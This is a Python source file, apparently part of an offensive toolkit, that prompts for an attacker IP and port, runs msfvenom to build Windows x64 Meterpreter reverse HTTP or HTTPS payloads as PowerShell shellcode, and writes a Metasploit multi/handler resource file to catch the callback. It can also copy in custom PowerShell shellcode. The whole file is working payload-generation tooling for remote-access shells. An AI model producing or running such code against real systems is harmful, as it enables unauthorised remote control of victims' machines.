import os
import random
import shutil

class msfvenom_payload_create:

    def __init__(self):
        self.msfrc = ""
        self.tempfile = "./temp/temp%s.ps1"%random.randint(1000,9999)
        self.allowinput=['M','m','C','c']
        self.allowinputflag = False

        while not self.allowinputflag:
            self.choose_method = input('Custom payload or Make common payload \033[92m(C/M)\033[0m:')
            if self.choose_method in self.allowinput:
                self.allowinputflag = True
            else:
                pass

        if self.choose_method == "m" or self.choose_method == 'M':
            self.msfrc ='console_%s_.rc'%random.randint(1000,9999)
            print('\033[94m[1]\033[0m', 'win_x64_rev_http')
            print('\033[94m[2]\033[0m', 'win_x64_rev_https')
            print('-----------------------------------------------')
            self.msf_payload_choose = input('what payload do you want to choose ?:\n>>>')
            self.IP   = input('\033[1mYour IP\033[0m >>> ')
            self.port = input ("\033[1mListen Port\033[0m >>> ")
        elif self.choose_method == "C" or self.choose_method == 'c':
            self.raw_file_path = input('powershell file path:')

    def payload(self):
        http  = "windows/x64/meterpreter/reverse_http"
        https = "windows/x64/meterpreter/reverse_https"
        if self.msf_payload_choose == '1':
            return http
        elif self.msf_payload_choose == '2':
            return https

    # def outputpath(self):
    #     path = '/'.join((os.getcwd(),'temp/'))
    #     return path

    def generate_msfconsole_rc(self):
        with open ("/".join([os.getcwd(),'temp',self.msfrc]),'w') as msfconsole:
            msfconsole.write('\n'.join(['use exploit/multi/handler',
                                        'set PAYLOAD %s' %self.payload(),
                                        'set LHOST %s' %self.IP,
                                        'set LPORT %s' %self.port,
                                        'exploit -j -z',
                                       ]))
    def copyshellcode(self):
        shutil.copy(self.raw_file_path,self.tempfile)
        print('\033[92m' + '[*]' + '\033[0m'+'------> shellcode copied <------')

    def run_action(self):
        if self.choose_method == "m" or self.choose_method == 'M':
            os.system('msfvenom -p %s LHOST=%s LPORT=%s -f powershell -a x64 --platform windows > %s'
                      % (self.payload(), self.IP, self.port, self.tempfile,))
            self.generate_msfconsole_rc()
        elif self.choose_method == "C" or self.choose_method == 'c':
            self.copyshellcode()